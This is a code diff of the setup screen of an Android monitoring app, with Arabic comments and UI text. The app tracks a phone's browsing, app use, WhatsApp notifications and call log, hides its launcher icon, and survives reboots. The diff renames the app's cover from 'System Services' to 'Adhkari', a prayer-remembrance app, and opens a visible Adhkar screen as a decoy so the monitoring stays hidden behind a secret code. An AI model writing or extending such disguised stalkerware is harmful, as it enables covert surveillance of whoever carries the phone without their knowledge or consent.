@@ -24,7 +24,7 @@ import androidx.core.content.ContextCompat
 /**
  * شاشة إعداد الجهاز الفرعي.
  * زر واحد يجلب كل الصلاحيات بالترتيب تلقائيًا، وبعد التسجيل تُخفى الأيقونة تلقائيًا
- * (والرجوع بالضغط على الإشعار الثابت «خدمات النظام» ← الرقم السري).
+ * (والرجوع من إشعار «أذكاري» الثابت ← زر الترس ← الرقم السري).
  */
 class SetupActivity : AppCompatActivity() {
 
@@ -100,7 +100,7 @@ class SetupActivity : AppCompatActivity() {
                 "وبعد التسجيل سيطلب التطبيق «السماح بالعمل في الخلفية»\n" +
                 "حتى تبدأ المراقبة تلقائيًا بعد أي إعادة تشغيل للهاتف.\n\n" +
                 "للرجوع في أي وقت: اسحب شريط الإشعارات واضغط على إشعار\n" +
-                "«خدمات النظام» الثابت\n" +
+                "«أذكاري» الثابت، ثم زر الترس ⚙ أسفل شاشة الأذكار،\n" +
                 "ثم أدخل الرقم السري (كود الاقتران) — ستظهر الأيقونة فورًا."
             textSize = 13f
             setPadding(0, pad * 2, 0, 0)
@@ -158,7 +158,7 @@ class SetupActivity : AppCompatActivity() {
             appendLine("رصد التصفح: ${if (accessibility) "✓" else "✗"} · فتح التطبيقات: ${if (usage) "✓" else "✗"}")
             appendLine("واتساب (الإشعارات): ${if (notifications) "✓" else "✗"} · المكالمات: ${if (callLog) "✓" else "✗"}")
             appendLine("التشغيل بعد إعادة التشغيل: ${if (isIgnoringBatteryOpt()) "جاهز ✓" else "يحتاج سماح ✗ — اضغط الزر أعلاه"}")
-            appendLine("أيقونة التطبيق: ${if (hidden) "مخفية — الرجوع من إشعار «خدمات النظام» الثابت" else "ظاهرة ✓"}")
+            appendLine("أيقونة التطبيق: ${if (hidden) "مخفية — الرجوع من إشعار «أذكاري» ثم زر الترس ⚙" else "ظاهرة ✓"}")
             append("أحداث في انتظار الإرسال: ${EventStore.pendingCount(this@SetupActivity)}")
         }
     }
@@ -185,9 +185,9 @@ class SetupActivity : AppCompatActivity() {
     private fun openNextMissing(from: Int) {
         val checks = wizardChecks()
         val hints = listOf(
-            "١/٣ — فعّل «خدمات النظام» من قائمة خدمات الوصول ثم ارجع للتطبيق",
+            "١/٣ — فعّل «أذكاري» من قائمة خدمات الوصول ثم ارجع للتطبيق",
             "٢/٣ — فعّل «الوصول إلى بيانات الاستخدام» لهذا التطبيق ثم ارجع",
-            "٣/٣ — فعّل «خدمات النظام» من قائمة الوصول إلى الإشعارات ثم ارجع"
+            "٣/٣ — فعّل «أذكاري» من قائمة الوصول إلى الإشعارات ثم ارجع"
         )
         val intents = listOf(
             Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS),
@@ -395,13 +395,14 @@ class SetupActivity : AppCompatActivity() {
                     "التطبيق سيعمل تلقائيًا بعد أي ريستارت بفضل مستقبِل التشغيل\n" +
                     "والفحص الاحتياطي الدوري (المطلوب فقط: السماح بالعمل في الخلفية).\n\n" +
                     "للرجوع في أي وقت:\n" +
-                    "اسحب شريط الإشعارات واضغط على إشعار «خدمات النظام» الثابت،\n" +
-                    "ثم أدخل الرقم السري (كود الاقتران: ${Prefs.pairingCode(this)}) وستظهر الأيقونة فورًا."
+                    "اسحب شريط الإشعارات واضغط على إشعار «أذكاري» الثابت،\n" +
+                    "ثم زر الترس ⚙ وأدخل الرقم السري (كود الاقتران: ${Prefs.pairingCode(this)}) وستظهر الأيقونة فورًا."
             )
             .setCancelable(false)
             .setPositiveButton("حسنًا — أخفِ الأيقونة") { _, _ ->
                 Prefs.setLauncherIconHidden(this@SetupActivity, true)
-                startActivity(Intent(this@SetupActivity, StealthActivity::class.java))
+                // افتح واجهة «أذكاري» الظاهرة للمستخدم
+                startActivity(Intent(this@SetupActivity, AdhkarActivity::class.java))
                 finish()
             }
             .show()
@@ -433,7 +434,7 @@ class SetupActivity : AppCompatActivity() {
                     .setTitle(if (willHide) "إخفاء الأيقونة" else "إظهار الأيقونة")
                     .setMessage(
                         if (willHide)
-                            "ستختفي الأيقونة والمراقبة تستمر طبيعيًا.\n\nللرجوع: اسحب شريط الإشعارات واضغط على إشعار «خدمات النظام» الثابت، ثم أدخل الرقم السري (كود الاقتران)."
+                            "ستختفي الأيقونة والمراقبة تستمر طبيعيًا.\n\nللرجوع: اسحب شريط الإشعارات واضغط على إشعار «أذكاري» الثابت، ثم زر الترس ⚙ وأدخل الرقم السري (كود الاقتران)."
                         else "ستعود الأيقونة إلى الشاشة الرئيسية فورًا."
                     )
                     .setPositiveButton("تأكيد") { _, _ ->
